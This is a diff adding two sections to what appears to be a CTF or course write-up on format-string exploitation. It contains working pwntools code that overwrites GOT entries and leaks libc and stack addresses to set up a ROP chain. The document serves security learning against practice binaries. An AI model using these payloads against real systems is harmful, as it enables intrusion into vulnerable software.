@@ -443,3 +443,139 @@ def main():
     p0.interactive()
 ```
 
+## Challenge 9
+
+Now there's a single invocation of the format vuln. \
+However, it isn't pie, and we can overwrite a GOT entry. 
+
+```python
+p0 = process(BINARY)
+rsp_to_format_offset = 501
+format_to_puts_got_offset = 19
+prefix_string_size = 117
+
+format_size = 0x300
+puts_got_offset = rsp_to_format_offset + format_to_puts_got_offset
+puts_got_position =  6 + int(puts_got_offset / 8)
+
+buf_2 = b''
+buf_2 += b'%' + str(binary_win_addr - prefix_string_size).encode() + b'c'
+buf_2 += b'%' + str(puts_got_position).encode() + b'$n'
+buf_2 += 5 * b'B'
+buf_2 += struct.pack('<Q', exit_got)
+buf_2 += b'A' * (format_size - len(buf_2))
+p0.send(buf_2)
+
+p0.interactive()
+```
+
+## Challenge 10
+
+Can only activate the vuln once. However, partial RELRO and no PIE - hence we'd overwrite some GOT entry. \
+The only good candidate is `exit`, as it is the only method being called after `printf` (no canary checks, so no `__stack_chk_fail`). 
+
+We can overwrite `exit` to the start address of the program, hence restarting it - giving us the ability to execute the vuln as many times as we wish, now having the ability to leak any values we'd like off the stack. 
+Moreover, we can write content to the stack, and pivoting the frame pointer, so that ROP would be triggered. 
+
+```python
+def gen_read_format_string(rsp_to_format_offset, position):
+    buf = b''
+    buf += b'%' + str(position).encode() + b'$s'
+    buf += b'B' * (8 - ((rsp_to_format_offset + len(buf)) % 8))
+
+    return buf
+
+def read_addr(p, payload_size, rsp_to_format_offset, address):
+    init_position = 6 + int(rsp_to_format_offset / 8)
+    buf = gen_read_format_string(rsp_to_format_offset, init_position)
+
+    position = 6 + int((rsp_to_format_offset + len(buf)) / 8)
+    buf = gen_read_format_string(rsp_to_format_offset, position)
+
+    buf += struct.pack('<Q', address)
+    buf += (payload_size - len(buf)) * b'A'
+
+    p.send(buf)
+    p.recvuntil(b'Your input is:')
+    p.recvuntil(b'\n')  # contains many spaces
+    leak_addr = struct.unpack('<Q', p.recv(6) + b'\x00' * 2)[0]
+
+    return leak_addr
+
+def gen_write_format_string(rsp_to_format_offset, position, value, prefix_string_size):
+    buf = b''
+
+    # First trick - trigger a write of 0, of length 8 bytes. That would clear all bits.
+    # buf += b'%' + str(position).encode() + b'$ln'
+
+    value_bytes = list(struct.unpack('<HHHH', struct.pack('<Q', value)))
+    value_bytes_sorted = sorted(value_bytes)
+
+    for val in value_bytes_sorted:
+        if val == 0:
+            continue
+        val_index = value_bytes.index(val)
+        if (val != prefix_string_size):  # Handle duplication, no need to write more bytes
+            buf += b'%' + str(val - prefix_string_size).encode() + b'c'
+        buf += b'%' + str(position + val_index).encode() + b'$hn'
+        prefix_string_size = val
+        value_bytes[val_index] = b'\xffffffff'  # Invalidate byte, to handle duplications
+
+    buf += b'B' * (8 - ((rsp_to_format_offset + len(buf)) % 8))
+
+    return buf
+
+
+def write_addr_payload(rsp_to_format_offset, address, value, prefix_string_size = 0):
+    # Notice: there's probably more elegant way to do this. 
+    init_position = 6 + int(rsp_to_format_offset / 8)
+    buf = gen_write_format_string(rsp_to_format_offset, init_position, value, prefix_string_size)
+
+    position = 6 + int((rsp_to_format_offset + len(buf)) / 8)
+    buf = gen_write_format_string(rsp_to_format_offset, position, value, prefix_string_size)
+
+    buf += struct.pack('<Q', address)
+    buf += struct.pack('<Q', address + 2)
+    buf += struct.pack('<Q', address + 4)
+    buf += struct.pack('<Q', address + 6) 
+    
+    return buf
+
+def write_addr(p, payload_size, rsp_to_format_offset, address, value, prefix_string_size):
+    buf = write_addr_payload(rsp_to_format_offset, address, value, prefix_string_size)
+    buf += (payload_size - len(buf)) * b'A'
+    p.send(buf)
+    p.recvuntil(b'Your input is:')
+
+
+
+def main(): 
+    p0 = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
+    # p0 = process(BINARY)
+    rsp_to_format_offset = 0x111
+    prefix_string_size = 33
+
+    payload_size = 0x350
+
+    # Overwrite exit's GOT, so we would have infinate invocations.
+    # Keep in mind - we have to make sure $rsp remains valid - aligned to 0x10, before calling printf once again. Hence, we would jump to legitimate site - 'func'
+    write_addr(p0, payload_size, rsp_to_format_offset, address=exit_got, value=binary_func_addr, prefix_string_size=prefix_string_size)
+
+    # Leak libc
+    libc_leak_addr = read_addr(p0, payload_size, rsp_to_format_offset, address=printf_got)
+    libc_base = libc_leak_addr - libc_printf_offset
+    print(f'libc_base:{hex(libc_base)}')
+    assert(libc_base & 0xfffffffffffff000 == libc_base)
+
+    # Cute trick, Leak stack using libc leak
+    environ_addr = libc_base + libc_environ_offset
+    environ_leak_addr = read_addr(p0, payload_size, rsp_to_format_offset, address=environ_addr)
+    print(f'environ_leak_addr:{hex(environ_leak_addr)}')
+
+    # Forge ROP
+    chmod_addr = libc_base + libc_chmod_offset
+
+    p0.interactive()
+```
+
+
